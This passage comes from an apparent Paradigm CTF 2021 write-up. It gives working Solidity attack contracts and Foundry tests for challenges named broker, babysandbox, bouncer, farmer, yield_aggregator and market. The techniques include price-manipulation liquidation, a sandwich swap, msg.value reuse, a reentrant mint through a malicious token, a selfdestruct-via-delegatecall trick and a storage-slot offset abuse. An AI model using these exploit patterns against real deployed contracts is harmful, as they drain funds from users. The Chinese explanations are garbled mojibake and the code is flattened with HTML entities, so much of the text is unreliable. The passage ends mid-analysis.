= setup.weth(); token = setup.token(); broker = setup.broker(); &#125; // get AWT from airdrop function getAWT() internal &#123; for (uint i; i &lt; 3; i++) &#123; new BrokerHelper(address(token)); &#125; &#125; function pwn() public payable &#123; require(msg.value == 4975 ether, &quot;You must pay 4975 ether&quot;); // 1. get 30 token getAWT(); // hacker&#x27;s token = 30 ether // 2. get 4975 ether WETH weth.deposit&#123;value:msg.value&#125;(); // 3. transfer pair 4975 ether WETH weth.transfer(address(pair), weth.balanceOf(address(this))); // 4. modify the rate = 1:1 pair.swap(450_000 ether, 0, address(this), &quot;&quot;); // 5. call liquidate() token.approve(address(broker), type(uint256).max); uint amount = 23 ether * broker.rate(); broker.liquidate(address(setup), amount); // 6. verify require(setup.isSolved(), &quot;You don&#x27;t solve....&quot;); &#125;&#125;contract BrokerHelper &#123; constructor(address _token) &#123; Token token = Token(_token); token.airdrop(); token.transfer(msg.sender, 10 ether); &#125;&#125; 0x04-babysandbox1. request ä½¿å¾—sandboxåˆçº¦çš„ä»£ç ä¸º0ï¼Œå³æ¯æ‰sandboxåˆçº¦ã€‚ 2. analysis BabySandboxä¸­åªæœ‰ä¸€ä¸ªrunå‡½æ•°ï¼Œåˆ†ærunå‡½æ•°ï¼š å‡½æ•°ä½“ä¸­æœ‰ä¸‰ä¸ªè°ƒç”¨ï¼Œåˆ†åˆ«æ˜¯delegatecall, staticcall, callï¼Œå°†è¿™ä¸‰ä¸ªè°ƒç”¨ç¿»è¯‘ä¸ºç†Ÿæ‚‰çš„solidityè¯­è¨€ä¸º 123456address(code).delegatecall(&quot;&quot;);address(this).staticcall(msg.data);address(this).call(msg.data);// è¿™é‡Œçš„msg.data å·²ç»è¢«å¦‚ä¸‹æ“ä½œæ‹·è´åˆ°memory [0x00 - calldatasize-1]çš„ä½ç½®å»äº†calldatacopy(0x00, 0x00, calldatasize()) // å°†msg.dataä»0x00çš„ä½ç½®æ‹·è´åˆ°memory0x00çš„ä½ç½® æ˜¾ç„¶ï¼Œè¦ä½¿å¾—è¯¥åˆçº¦è‡ªæ¯ï¼Œåªèƒ½é€šè¿‡delegatecallï¼Œè€Œä¸”è¿™æ˜¯ä¸€ä¸ªç©ºè°ƒç”¨ï¼Œæ‰€ä»¥è‡ªæ¯é€»è¾‘éœ€è¦åœ¨codeçš„fallbackä¸­ã€‚å¹¶ä¸”delegatecallçš„è°ƒç”¨è€…å¿…é¡»æ˜¯æœ¬åˆçº¦è‡ªå·±ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡åé¢çš„staticallå’Œcallæ¥è°ƒç”¨ï¼Œä½†æ˜¯æ¶‰åŠäº†ä¿®æ”¹åˆçº¦çš„çŠ¶æ€ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡callã€‚å› æ­¤ï¼Œéœ€è¦ä¿è¯staticcallè°ƒç”¨æˆåŠŸï¼ˆä¸”ä¸ä¿®æ”¹åˆçº¦å˜é‡ï¼‰ï¼Œcallè°ƒç”¨æˆåŠŸï¼ˆä¿®æ”¹åˆçº¦å˜é‡ï¼‰ï¼Œtaä»¬éƒ½ä¼šå†æ¬¡è°ƒç”¨è‡ªèº«çš„runå‡½æ•°ï¼Œæ‰§è¡Œdelegatecallï¼Œè¿™å°±éœ€è¦ç¡®ä¿ï¼Œè°ƒç”¨codeçš„ä¸¤æ¬¡fallbackè¾¾æˆä¸¤ç§ä¸åŒçš„æ•ˆæœäº†ï¼ˆç¬¬ä¸€æ¬¡è°ƒç”¨ä¸æ”¹å˜å˜é‡ï¼Œå³deletecallæˆåŠŸæ‰§è¡Œï¼Œreturnï¼Œè·³å‡ºstaticcallåˆçº¦è°ƒç”¨æ ˆï¼›ç¬¬äºŒæ¬¡æ‰§è¡Œè‡ªæ¯é€»è¾‘ï¼Œå³deletecallæˆåŠŸæ‰§è¡Œï¼Œreturnï¼Œè·³å‡ºcallåˆçº¦è°ƒç”¨æ ˆï¼Œæœ‰ç‚¹ç±»ä¼¼ethernautçš„elevatorï¼‰ã€‚ è¿™é‡Œæä¾›äº†ä¸¤ç§è§£é¢˜æ–¹æ³•ï¼Œä¸€ç§æ˜¯é€šè¿‡å†·çƒ­åœ°å€æ¶ˆè€—çš„gaså®ç°ï¼Œä¸€ç§æ˜¯é€šè¿‡try...catchè¯­å¥å—æ¥å®ç°ã€‚ ï¼ˆæ³¨æ„ç¬¬äºŒç§æ–¹æ³•ï¼Œå› ä¸ºæ¯ä¸€ä¸ªè°ƒç”¨éƒ½æœ‰gasLimitâ€“0x4000ï¼Œæ‰€ä»¥éœ€è¦é€»è¾‘ä¸èƒ½å¤ªå¤æ‚ï¼Œè€Œä¸”è¿˜éœ€è¦äº‹å…ˆå°†thisè®°å½•ä¸‹æ¥ï¼Œè¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡é‡åˆ°ï¼Œå¯èƒ½æ˜¯å‡å°‘gasçš„æ¶ˆè€—å§ã€‚ï¼‰ 3. solveéªŒè¯æ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627282930pragma solidity 0.7.0;pragma experimental ABIEncoderV2;import &quot;forge-std/Test.sol&quot;;import &quot;../../../src/Paradigm_CTF_2021/babysandbox/Setup.sol&quot;;import &quot;./BabySandboxHacker_1.sol&quot;;import &quot;./BabySandboxHacker_2.sol&quot;;contract BabySandboxHacker is Test &#123; Setup setup; BabySandbox sandbox; // BabySandboxHacker_1 hacker; BabySandboxHacker_2 hacker; function setUp() public &#123; setup = new Setup(); sandbox = setup.sandbox(); // hacker = new BabySandboxHacker_1(); hacker = new BabySandboxHacker_2(); sandbox.run(address(hacker)); &#125; function test_isSloved() external &#123; assertEq(setup.isSolved(), true); &#125; &#125; æ”»å‡»åˆçº¦ 123456789101112131415161718192021222324252627282930313233343536373839404142// hacker1pragma solidity 0.7.0;contract BabySandboxHacker_1 &#123; function juge() internal view returns (uint gasused) &#123; uint before_ = gasleft(); uint balance = address(0).balance; gasused = before_ - gasleft(); &#125; fallback() external payable &#123; uint gasused = juge(); if (gasused &gt; 2600) &#123; return; &#125; else &#123; selfdestruct(payable(msg.sender)); &#125; &#125;&#125;// hacker2pragma solidity 0.7.0;contract BabySandboxHacker_2 &#123; // save gas BabySandboxHacker_2 private immutable self = this; event _chageState(); function chageState() external &#123; emit _chageState(); &#125; fallback() external payable &#123; try self.chageState() &#123; selfdestruct(payable(tx.origin)); &#125; catch &#123; return; &#125; &#125;&#125; 0x05-bouncer1. request å°†bouncerçš„balanceæç©ºã€‚ 2. analysis è¿™é“é¢˜çš„æ¼æ´åœ¨äº forå¾ªç¯ä¸­å¤ç”¨msg.valueã€‚ ä¸€å¼€å§‹setupå¾€bounerä¸­å­˜æ”¾äº†52etherã€‚ åˆ†æbounceråˆçº¦ï¼š åˆçº¦ä¸­æ¶‰åŠåˆ°è½¬è´¦ï¼ˆETHï¼‰çš„åªæœ‰ä¸¤ä¸ªå‡½æ•°claimFees() payout()ï¼Œ å› ä¸ºä¸æ˜¯ownerï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥æ‰§è¡ŒclainFeeså‡½æ•°ï¼Œä¹Ÿä¸èƒ½é€šè¿‡hatchå‡½æ•°è¿›è¡Œæ’æ§½è¦†ç›–ï¼Œåªèƒ½é€šè¿‡payoutå‡½æ•°ã€‚payount &#x3D;&gt; redeem &#x3D;&gt; covertã€‚æƒ³è¦é€šè¿‡payoutå–é’±ï¼Œåªèƒ½è°ƒç”¨redeemå‡½æ•°ï¼Œè€Œtokens mappingåªæœ‰åœ¨convertå‡½æ•°ä¸­å¯ä»¥èµ‹å€¼ï¼Œå–é’±çš„å‰ææ˜¯tokenå¿…é¡»æ˜¯address(ETH)ï¼Œè€Œä¸”ETHå’Œä»¥å¤ªçš„æ±‡ç‡ä¸º1ï¼š1ï¼Œæ‰€ä»¥è¦æ˜¯é€šè¿‡convertå‡½æ•°æ¢ï¼Œåªèƒ½æ”¯ä»˜å¤šå°‘æ¢å¤šå°‘WETHã€‚å†çœ‹åˆ°convertManyå‡½æ•°ï¼Œå¾ªç¯è°ƒç”¨convertï¼Œè¿™é‡Œå¾ˆæ˜æ˜¾ï¼Œåªæ”¯ä»˜ä¸€æ¬¡Entry.amountçš„è´¹ç”¨ï¼Œä¾¿å¯ä»¥å…‘æ¢ids.lengthæ¬¡ã€‚ ç»¼ä¸Šï¼Œæ”»å‡»æ€è·¯ä¸º hackerå¾€bouncerå­˜å…¥8ç»™Entry{amountï¼š10etherï¼Œtoken&#x3D;ETH}ï¼ˆæ­¤æ—¶bouncerâ€™s balance&#x3D;60etherï¼‰ æ„å»ºé•¿åº¦ä¸º7çš„ids hackerè°ƒç”¨convertManyå¹¶æ”¯ä»˜10etherï¼ˆå’ŒEntry.amountç›¸ç­‰ï¼Œæ­¤æ—¶bouncerâ€™s balance&#x3D;70etherï¼‰ï¼ŒconvertManyå‡½æ•°ä½“ä¸­è¿›è¡Œ7æ¬¡å…‘æ¢ï¼Œæ­¤æ—¶tokens[hacker]][ETH]==70 etherã€‚ é€šè¿‡redeemå‡½æ•°ä¸€æ¬¡æ€§å°†bouncerçš„ä½™é¢ï¼ˆ70etherï¼‰å…¨éƒ¨æç©ºã€‚ 3. solveæ”»å‡»åˆçº¦ï¼ˆenterå’ŒconvertManyä¸èƒ½åœ¨åŒä¸€ä¸ªå‡½æ•°ä¸­æ‰§è¡Œï¼Œéœ€è¦æ‹†åˆ†ï¼Œfoundryä¸­ä½¿ç”¨cheatcodeæ”¹å˜block.numberï¼‰ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../../../src/Paradigm_CTF_2021/bouncer/Setup.sol&quot;;contract BouncerHacker_ &#123; address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE; uint256 public constant entryFee = 1 ether; Setup setup; Bouncer bouncer; constructor(address _setup) &#123; setup = Setup(_setup); bouncer = setup.bouncer(); &#125; function pwn1() external payable &#123; require(msg.value == 8 ether, &quot;You must pay 8 ether&quot;); // 1. entry 8 Entry for (uint256 i = 0; i &lt; 8; i++) &#123; bouncer.enter&#123;value:entryFee&#125;(ETH, 10 ether); &#125; &#125; function pwn2() external payable &#123; require(msg.value == 10 ether, &quot;You must pay 10 ether&quot;); // 2. structure arrays() uint256[] memory ids = new uint256[](7); for (uint256 i = 0; i &lt; ids.length; i++) &#123; ids[i] = i; &#125; // 3. call convertMany() pay 10 ether to tokens[address(this)][ETH] == 70 ether bouncer.convertMany&#123;value:10 ether&#125;(address(this), ids); // 4. token out money bouncer.redeem(ERC20Like(ETH), bouncer.tokens(address(this), ETH)); // 5. is solved require(setup.isSolved(), &quot;You don&#x27;t sovle...&quot;); &#125; // To receive the ETHs receive() external payable &#123;&#125;&#125; æ”»å‡»åˆçº¦æµ‹è¯• 123456789101112131415161718192021222324252627282930313233343536373839// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;../../../src/Paradigm_CTF_2021/bouncer/Setup.sol&quot;;import &quot;./BouncerHacker_.sol&quot;;contract BouncerHacker is Test &#123; string constant path_WETH9 = &quot;out/WETH9.sol/WETH9.json&quot;; Setup setup; BouncerHacker_ hacker; address weth; function setUp() public &#123; weth = deploy_WETH9(); setup = new Setup&#123;value: 100 ether&#125;(weth); hacker = new BouncerHacker_(address(setup)); &#125; function test_isSolved() public &#123; hacker.pwn1&#123;value: 8 ether&#125;(); // Here need set block.number increase // require(block.timestamp != entry.timestamp, &quot;err/wait after entering&quot;); vm.warp(block.number + 1); hacker.pwn2&#123;value: 10 ether&#125;(); assertEq(setup.isSolved(), true); &#125; function deploy_WETH9() internal returns (address _weth) &#123; bytes memory bytecode = vm.getCode(path_WETH9); assembly &#123; _weth := create(0, add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; 0x06-farmer1. request faucetçš„COMPä½™é¢ä¸º0ï¼Œfarmerçš„COMPä½™é¢ä¸º0ï¼Œfarmerçš„DAIä½™é¢å°äºexpectedBalanceã€‚ 2. analysis ä»isSolve()å‡½æ•°ä¸­å¯ä»¥è¿½æº¯åˆ°CompFaucetï¼ŒCompDaiFarmeråˆçº¦ï¼Œ å¯ä»¥çœ‹åˆ°ï¼ŒComFaucet::claimComp()å‡½æ•°å¯ä»¥è¢«äººä»»ä½•äººè°ƒç”¨ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è°ƒç”¨è¯¥å‡½æ•°ä½¿å¾—faucetçš„COMPä½™é¢ä¸º0ï¼ˆå°†æ‰€æœ‰çš„COMPè½¬ç§»ç»™äº†Farmerï¼‰ã€‚CompDaiFarmer::recycle()å‡½æ•°åˆ™æ˜¯å°†åˆçº¦ä¸­æ‰€æœ‰COMPå…‘æ¢æˆdaiï¼Œå…‘æ¢ä¹‹åï¼Œfarmerçš„COMPä½™é¢ä¸º0ã€‚æ‰€ä»¥é¢˜ç›®çš„å‰ä¸¤ä¸ªè¦æ±‚å¯ä»¥æ»¡è¶³ï¼Œæ­¤æ—¶éœ€è¦æƒ³åŠæ³•ä½¿å¾—DAI.balanceOf(address(farmer)) &lt; expectedBalanceï¼Œçœ‹åˆ°expectedBalanceçš„è®¡ç®—æ–¹å¼ï¼š 12345678910111213expectedBalance = DAI.balanceOf(address(farmer)) + farmer.peekYield();// peekYield() function peekYield() public view returns (uint256) &#123; uint256 claimableAmount = IComptroller(comptroller).claimableComp(); address[] memory path = new address[](3); path[0] = address(COMP); path[1] = address(WETH); path[2] = address(dai); uint256[] memory amounts = router.getAmountsOut(claimableAmount, path); return amounts[2]; &#125; å¯ä»¥çŸ¥é“ï¼šfarmer.peekYield()=COMP=&gt;WETH=&gt;daiã€‚ åˆ†æå„åˆçº¦çš„ä»£å¸ï¼š contract COMP WETH dai setup faucet WETH(50)&#x3D;&gt;COMP farmer equal comp.balance(faucet) COMP&#x3D;&gt;WETH&#x3D;&gt;dai hacker WETH&#x3D;&gt;COMP 5000 WETH&#x3D;&gt;dai é¢˜ç›®ä¸­çš„expectedBalanceçš„å€¼å®é™…ä¸Šæ˜¯æ ¹æ®å½“æ—¶çš„poolä»·æ ¼ã€æ±‡ç‡æ±‚å‡ºæ¥çš„ï¼›è€Œåœ¨v2 poolä¸­ä»£å¸çš„ä»·æ ¼å’Œä»£å¸é—´çš„æ±‡ç‡æ˜¯å¯ä»¥è¢«æ“æ§çš„ï¼Œå‰ææ˜¯ç»´æŒæ»‘ç‚¹ K ä¸å˜å³å¯ã€‚ åˆ†ææ±‡ç‡å˜åŒ–å¯¹expectedBalanceå€¼çš„å½±å“ï¼š daiè´¬å€¼ï¼šDAI.balanceOf(address(farmer)) &gt; expectedBalance daiå‡å€¼ï¼šDAI.balanceOf(address(farmer)) &lt; expectedBalanceï¼Œè¿™æ­£æ˜¯é¢˜ç›®çš„è¦æ±‚ï¼Œæ‰€ä»¥é—®é¢˜è½¬åŒ–ä¸ºå¦‚ä½•ä½¿daiå‡å€¼ã€‚ ä»£å¸ (COMP,WETH) (WETH,dai) COMP COMPæ•°é‡å¢å¤šï¼ŒCOMPè´¬å€¼ï¼ŒWETHå‡å€¼ WETH WETHæ•°é‡å¢å¤šï¼ŒWETHè´¬å€¼ï¼ŒCOMPå‡å€¼ WETHæ•°é‡å¢å¤šï¼ŒWETHè´¬å€¼ï¼Œdaiå‡å€¼ dai daiæ•°é‡å¢å¤šï¼Œdaiè´¬å€¼ï¼ŒWETHå‡å€¼ æˆ‘æ‰‹ä¸­æœ‰5000 ether WETH ï¼Œæˆ‘èƒ½å¤Ÿå½±å“åˆ° comp,wethï¼Œweth,daiè¿™é‡Œä¸¤ä¸ªäº¤æ˜“æ± ã€‚åœ¨COMP=&gt;WETH=&gt;daiçš„å…‘æ¢è·¯å¾„ä¸­ï¼Œå¯ä»¥äº‹å…ˆç”¨æ‰‹ä¸­çš„WETHåœ¨weth,daiäº¤æ˜“æ± ä¸­æ¢å‡ºdaiï¼Œæ­¤æ—¶daiå‡å€¼ï¼ŒCOMP=&gt;WETH=&gt;daiæ¢å‡ºçš„daiä¾¿ä¼šå°äºé¢„æœŸã€‚ è¿™æ˜¯å…¸å‹çš„ DeFi Sandwich Attacksï¼ˆä¸‰æ˜æ²»æ”»å‡»ï¼‰ã€‚ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../../../src/Paradigm_CTF_2021/farmer/Setup.sol&quot;;contract FarmerHacker_ &#123; Setup setup; WETH9 WETH; CompDaiFarmer farmer; CompFaucet faucet; UniRouter ROUTER; ERC20Like DAI; constructor(address _setup) &#123; setup = Setup(_setup); WETH = setup.WETH(); farmer = setup.farmer(); faucet = setup.faucet(); ROUTER = setup.ROUTER(); DAI = setup.DAI(); &#125; function pwn() public payable &#123; // 1. should pay only a little ETH to deposit WETH require(msg.value == 1 ether); // 2. depoist WETH WETH.deposit&#123;value:msg.value&#125;(); WETH.approve(address(ROUTER), msg.value); // 3. raise the price of dai // 3.1 set path address[] memory path = new address[](2); path[0] = address(WETH); path[1] = address(DAI); // 3.2 WETH =&gt; dai, uint bal = WETH.balanceOf(address(this)); ROUTER.swapExactTokensForTokens( bal, 0, path, address(this), block.timestamp ); // 4. call claim() to make COMP.balanceOf(faucet)==0 farmer.claim(); // 5. call recycle() to make COMP.balanceOf(farmer) == 0, // DAI.balanceOf(address(farmer)) &lt; expectedBalance farmer.recycle(); // 6. is solved require(setup.isSolved(), &quot;!sloved&quot;); &#125;&#125; 0x07-yield_aggregator1. request å°†aggregatorå’Œbankçš„WETHä»£å¸æç©ºã€‚ åˆå§‹çŠ¶æ€ä¸ºï¼šweth.balanceOf(address(aggregator)) == 0 etherï¼Œ â€‹ weth.balanceOf(address(bank)) == 50 ether 2. analysis åˆ†æ MiniBankåˆçº¦ è¯¥åˆçº¦å¾ˆç®€å•ï¼Œä¸€ä¸ªé“¸å¸ä¸€ä¸ªé”€å¸å‡½æ•°ï¼Œé“¸å¸çš„æ¡ä»¶æ˜¯éœ€è¦æ”¯ä»˜ç­‰é¢çš„WETHä»£å¸æ‰å¯ä»¥ä½¿å¾—é“¶è¡Œbalanceå¢åŠ ç­‰åŒçš„æ•°é¢ï¼Œé”€å¸åˆ™æ˜¯éœ€è¦é“¶è¡Œä½™é¢å¤§äºæˆ–ç­‰äºé”€å¸æ•°é¢æ‰å¯ä»¥æˆåŠŸï¼Œå¹¶å‘è°ƒç”¨è€…è½¬å…¥ç­‰é¢çš„WETHä»£å¸ã€‚ åˆ†æ YieldAggregator åˆçº¦ è¯¥åˆçº¦ä¸¤ä¸ªå‡½æ•°ï¼Œdepositå’Œwithdrawã€‚ depositå‡½æ•°ç±»ä¼¼ä¸€ä¸ªäº¤æ¢å¹³å°ï¼Œè´Ÿè´£å°†tokenä»£å¸è½¬æ¢ä¸ºé“¶è¡Œä½™é¢ï¼ˆè¯¥è½¬æ¢å¹³å°ï¼Œåªèƒ½è½¬æ¢WETHä»£å¸ï¼Œå…¶ä»–ä»£å¸æ— æ³•è½¬ï¼Œå› ä¸ºè¯¥åˆçº¦çš„WETHä»£å¸æ•°é‡åˆå§‹åŒ–ä¸º0ï¼Œè½¬æ¢å…¶ä»–ä»£å¸å‡½æ•°ä¹Ÿä¸ä¼šæŠ¥é”™ï¼‰ã€‚ withdrawå‡½æ•°è´Ÿè´£ï¼Œä»bankä¸­å–å‡ºWETHï¼Œå†å½’è¿˜ç­‰é¢çš„tokenç»™msg.senderã€‚ä¸è¿‡å‰ææ˜¯ï¼Œmsg.senderçš„poolTokensæœ‰è¶³å¤Ÿå¤šçš„æ•°é¢ã€‚ ç»¼ä¸Šï¼Œèƒ½å–å‡ºWETHä»£å¸çš„ï¼Œåªæœ‰burn() å’Œ withdraw()å‡½æ•°ã€‚çœ‹åˆ°poolTokensçš„èµ‹å€¼æ–¹å¼ï¼š 12345uint256 balanceBefore = protocol.balanceUnderlying(); // .....uint256 balanceAfter = protocol.balanceUnderlying();uint256 diff = balanceAfter - balanceBefore;poolTokens[msg.sender] += diff; diffçš„å€¼ç”±bankçš„WETHä»£å¸æ•°é‡å˜åŠ¨ç¡®å®šï¼Œè€Œå‡½æ•°ä½“ä¸­çš„tokenå¯ä»¥è‡ªå®šä¹‰ï¼Œæ‰€ä»¥å…³äºtokençš„å‡½æ•°è°ƒç”¨ä¸­å­˜åœ¨äº†å¾ˆå¤šæ‰§è¡Œæ¶æ„æ“ä½œç©ºé—´ï¼Œå³transferFromå’Œapproveå‡½æ•°ä¸­å¯ä»¥è‡ªå®šä¹‰å‡½æ•°é€»è¾‘ã€‚åªéœ€è¦åœ¨transferFromå‡½æ•°ä¸­ï¼Œæ‰§è¡Œbank.mint() è¿™æ ·ä¸€æ¥æ—¢å¯ä»¥ä½¿bankçš„ä½™é¢å¢åŠ ï¼Œä¹Ÿå¯ä»¥ä½¿poolTokens[hacker]çš„å€¼å¢åŠ ï¼Œå³å­˜ä¸€ä»½WETHå¯ä»¥å–å‡ºä¸¤å€çš„WETHã€‚ï¼ˆäº‹å…ˆä¹°å¥½WETHã€æŒ‘æˆ˜è€…æ‹¥æœ‰5000 etherã€‘ï¼Œå†å¯¹bankè¿›è¡Œæˆæƒæ“ä½œï¼‰ 3. solveæ”»å‡»åˆçº¦ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;../../../src/Paradigm_CTF_2021/yield_aggregator/Setup.sol&quot;;contract YieldAggregatorHacker_ &#123; Setup setup; YieldAggregator aggregator; MiniBank bank; ERC20Like weth; constructor(address _setup) &#123; setup = Setup(_setup); aggregator = setup.aggregator(); bank = setup.bank(); weth = bank.underlying(); &#125; function pwn() external payable &#123; require(msg.value == 50 ether, &quot;You must pay 50 ether&quot;); // 1. buy 50 ether WETH WETH9(address(weth)).deposit&#123;value: msg.value&#125;(); // 2. approve the bank WETH9(address(weth)).approve(address(bank), 50 ether); // 3. make `poolTokens[hacker] = 50 ether` address[] memory _tokens = new address[](1); _tokens[0] = address(this); uint256[] memory _amounts = new uint256[](1); _amounts[0] = 50 ether; aggregator.deposit(Protocol(address(bank)), _tokens, _amounts); // 4. take out the WETH through withdraw() _tokens[0] = address(weth); // modify the token aggregator.withdraw(Protocol(address(bank)), _tokens, _amounts); // 5. take out the WETH through burn() bank.burn(50 ether); // 6. juge isSolved require(setup.isSolved(), &quot;You don&#x27;t solve...&quot;); &#125; // nothing to do function approve(address, uint256) external returns (bool)&#123; &#125; function transferFrom( address, address, uint256 ) external returns (bool)&#123; /** 1. make `balanceAfter - balanceBefore = 50 ether` 2. make `balanceOf[hacker] = 50 ether` */ bank.mint(50 ether); return true; &#125;&#125; æ”»å‡»åˆçº¦æµ‹è¯• 123456789101112131415161718192021222324252627282930313233343536// SPDX-License-Identifier: MITpragma solidity ^0.8.0;import &quot;forge-std/Test.sol&quot;;import &quot;./YieldAggregatorHacker_.sol&quot;;contract YieldAggregatorHacker is Test &#123; string constant path_WETH9 = &quot;out/WETH9.sol/WETH9.json&quot;; address weth; Setup setup; YieldAggregator aggregator; MiniBank bank; YieldAggregatorHacker_ hacker; function setUp() public &#123; weth = deploy_WETH9(); setup = new Setup&#123;value: 100 ether&#125;(weth); aggregator = setup.aggregator(); bank = setup.bank(); hacker = new YieldAggregatorHacker_(address(setup)); &#125; function test_isSolved() public &#123; hacker.pwn&#123;value: 50 ether&#125;(); assertEq(setup.isSolved(), true); &#125; function deploy_WETH9() internal returns (address _weth) &#123; bytes memory bytecode = vm.getCode(path_WETH9); assembly &#123; _weth := create(0, add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; 0x08-market1. request å°†Marketåˆçº¦çš„balanceæç©ºï¼Œåˆå§‹Marketçš„balance&#x3D;50etherã€‚ 2. analysis å…ˆåˆ†æEternalStorageåˆçº¦ è¿™ä¸ªåˆçº¦åœ¨fallbackå‡½æ•°ä¸­ï¼Œé€šè¿‡æ±‡ç¼–å®ç°äº†EternalStorageAPIçš„æ‰€æœ‰å‡½æ•°ï¼Œæ ¹æ®fallbackä¸­çš„é€»è¾‘ï¼Œå¯ä»¥å°†EternalStorageåˆçº¦çš„å±æ€§æŠ½è±¡å‡ºæ¥ï¼Œå¦‚ä¸‹ï¼š 123456789101112131415contract EternalStorage &#123; address owner; address pendingOwner; // ç±»ä¼¼ä¸€ä¸ªmapping mapping(bytes32 =&gt; TokenInfo) tokens; struct TokenInfo &#123; bytes32 name; // 0 bytes32 owner; // 0 + 1 bytes32 approval; // 0 + 2 bytes32 metadata; // 0 + 3 &#125;&#125; æ¥ç€åˆ†æCryptoCollectiblesMarketåˆçº¦ èƒ½ä»è¯¥åˆçº¦å–å‡º ETH çš„åªæœ‰sellCollectible()å‡½æ•°ï¼ˆwithdrawFee()è¯¥å‡½æ•°æ— æ³•è¢«è°ƒç”¨ï¼‰ï¼Œè§£é¢˜å…³é”®è‚¯å®šæ˜¯å­˜å°‘å–å¤šã€‚è¯¥å‡½æ•°è¦æ±‚tokenPrices[tokenId]&gt;0ï¼Œæ‰€ä»¥åªèƒ½é€šè¿‡mintCollectible()å‡½æ•°èµ‹å€¼ï¼Œè€Œä¸”è¦æ±‚è°ƒç”¨è€…ä¸ºä»£å¸çš„æ‰€æœ‰è€…ï¼Œè¯¥marketè¢«ä»£å¸æ‰€æœ‰è€…æˆæƒã€‚ è¯ä¸å¤šè¯´ï¼Œç›´æ¥è¯´é‡ç‚¹ã€‚ å¯ä»¥æ³¨æ„åˆ°ï¼Œåœ¨TokenInfoç»“æ„ä½“ä¸­æœ‰ä¸€ä¸ªmetadataå±æ€§ï¼Œè¿™ä¸ªå±æ€§å¾ˆå…³é”®ã€‚å¯ä»¥çŸ¥é“æ¯ä¸ªtokenIdçš„æ‰€åœ¨çš„ä½ç½®ä¸ºï¼šslot tokenId + 0 = name, slot tokenId + 1 = owner, slot tokenId + 2 = approval, slot tokenId + 3 = metadataã€‚ åˆ†æé“¸å¸ä¹‹åtokenIdå¯¹åº”ç»“æ„ä½“çš„å˜åŒ–ï¼š 123456// after mint// slot = tokenId+ 0 (name): &quot;My First Collectible&quot;,+ 1 (owner): owner+ 2 (approval): + 3 (metadata): å°†æ‰‹ä¸­çš„tokenIdå–ç»™marketï¼Œè¯¥ç»“æ„å±æ€§çš„å˜åŒ–ï¼š è¦å–ç»™marketä¹‹å‰éœ€è¦é€šè¿‡tokençš„approveå‡½æ•°ç»™marketæˆæƒã€‚ 123456// after market sell// slot = tokenId+ 0 (name): &quot;My First Collectible&quot;,+ 1 (owner): market+ 2 (approval): 0+ 3 (metadata): é‚£ä¹ˆè¦å¦‚ä½•å®ç°â€å­˜ä¸€æ¬¡é’±å–å¤šæ¬¡å‘¢â€ï¼Ÿ é€šè¿‡updateName(bytes32,bytes32)å°†åˆšåˆšå–å‡ºçš„tokenIdç»™è‡ªå·±æˆæƒ 1.1 è°ƒç”¨è¯¥å‡½æ•°çš„å‰æè¦é€šè¿‡ensureTokenOwner(tokenId)ï¼Œè€Œåœ¨ensureTokenOwner(tokenId)å‡½æ•°ä¸­ï¼Œæ£€éªŒçš„æ–¹æ³•ä¾¿æ˜¯eq(caller(), sload(add(tokenId, 1)))ï¼Œè¦æ±‚è°ƒç”¨è€…callerï¼Œè¦å’Œsload(add(tokenId, 1))è¯¥ä½ç½®ï¼ˆapprovalï¼‰çš„å€¼ç›¸ç­‰ï¼Œå¦‚æœåœ¨è°ƒç”¨updateNameå‡½æ•°çš„ä½¿ç”¨ï¼Œä¼ å…¥çš„tokenIdä¸ºtokenId+2é‚£ä¹ˆä¼šæœ‰ä¸€ä¸ªå¾ˆç¥å¥‡çš„åœ°æ–¹ï¼ŒensureTokenOwner(tokenId)åˆ¤æ–­çš„ä½ç½®ä¸ºcallerå’Œsload(add(add(tokenId, 2), 1))è¯¥ä½ç½®ï¼ˆmetadataï¼‰çš„å€¼ç›¸ç­‰ã€‚ 1.2 æ‰€ä»¥é‡ç‚¹æ¥äº†ï¼ï¼ï¼åªè¦åœ¨é“¸å¸ä¹‹åï¼Œå–å¸ä¹‹å‰å°†metadataéƒ¨åˆ†çš„å€¼è®¾ä¸ºhackerè‡ªå·±ï¼Œé‚£ä¹ˆæ¯æ¬¡éƒ½è¦é€šè¿‡updataName(tokenId+2, hacker)ï¼Œä½¿approvalçš„å€¼ï¼Œç”±0å˜æˆhackerã€‚ 1.3 æ­¤æ—¶å°±å¯ä»¥å®ç°å°†å–å‡ºçš„å¸ä¸é€šè¿‡marketå®Œæˆç»™è‡ªå·±æˆæƒçš„æ“ä½œã€‚ å†çœ‹åˆ°Marketçš„transferFromå‡½æ•°ï¼Œè¯¥å‡½æ•°çš„åŠŸèƒ½æ˜¯å°†ä»£å¸çš„æ‰€æœ‰æƒè½¬ç§»ç»™æŸä¸ªè´¦æˆ·ï¼Œå‰æï¼šè¯¥ä»£å¸çš„æ‰€æœ‰è€…å¿…é¡»ç»™è°ƒç”¨è€…æˆæƒï¼Œåœ¨ä¸Šä¸€æ­¥ä¸­å·²ç»çŸ¥é“å¦‚ä½•å®ç°ï¼Œä¸é€šè¿‡ä»£å¸æ‰€æœ‰è€…ç›´æ¥å®Œæˆæˆæƒæ“ä½œï¼ˆå‰ææ˜¯å®ç°ä¿®æ”¹ä»£å¸çš„metadataéƒ¨åˆ†ï¼‰ã€‚æ‰€ä»¥ä¾¿å¯ä»¥ä»¥approvalçš„èº«ä»½è°ƒç”¨è¯¥å‡½æ•°æˆä¸ºtokenIdçš„ownerã€‚ 